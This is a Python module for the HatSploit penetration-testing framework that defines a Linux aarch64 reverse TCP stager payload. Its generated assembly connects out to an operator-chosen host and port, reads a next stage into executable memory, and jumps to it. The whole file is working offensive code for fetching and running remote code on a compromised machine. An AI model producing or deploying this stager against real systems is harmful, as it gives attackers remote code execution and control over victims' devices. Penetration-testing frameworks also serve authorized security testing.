"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux aarch64 Reverse TCP",
            'Payload': "linux/aarch64/reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse TCP connection for Linux
                with AARCH64 architecture and reads next stage.
            """,
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Type': REVERSE_TCP,
        })

        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            mov x0, 0x2
            mov x1, 0x1
            mov x2, 0
            mov x8, 0xc6
            svc 0
        
            mov x12, x0
            adr x1, addr
            mov x2, 0x10
            mov x8, 0xcb
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cbnz w0, fail
            """

        if self.length.value:
            assembly += f"""
                mov x2, {hex(self.length.value)}
            """
        else:
            assembly += f"""
                mov x0, x12
                sub sp, sp, 16
                mov x1, sp
                mov x2, 4
                mov x8, 0x3f
                svc 0
            """

            if self.reliable.value:
                assembly += """
                    cmn x0, 1
                    beq fail
                """

            assembly += """
                ldr w2, [sp, 0]
                lsr x2, x2, 12
                add x2, x2, 1
                lsl x2, x2, 12
            """

        assembly += """
            mov x0, xzr
            mov x1, x2
            mov x2, 7
            mov x3, 0x22
            mov x4, xzr
            mov x5, xzr
            mov x8, 0xde
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmn x0, 1
                beq fail
            """

        if not self.length.value:
            assembly += """
                ldr w4, [sp]
            """
        else:
            assembly += f"""
                mov x4, {hex(self.length.value)}
            """

        assembly += f"""
            str x0, [sp]
            mov x3, x0

        loop:
            mov x0, x12
            mov x1, x3
            mov x2, x4
            mov x8, 0x3f
            svc 0

            cbz w0, fail
            add x3, x3, x0
            subs x4, x4, x0
            bne loop
        """

        if self.reliable.value:
            assembly += """
                cmn x0, 1
                beq fail
            """

        assembly += """
            ldr x0, [sp]
            blr x0
        """

        if self.reliable.value:
            assembly += """
            fail:
                mov x0, 1
                mov x8, 0x5d
                svc 0
            """

        assembly += f"""
        addr:
            .short 0x2
            .short 0x{self.rport.little.hex()}
            .word 0x{self.rhost.little.hex()}
        """

        return self.__asm__(assembly)
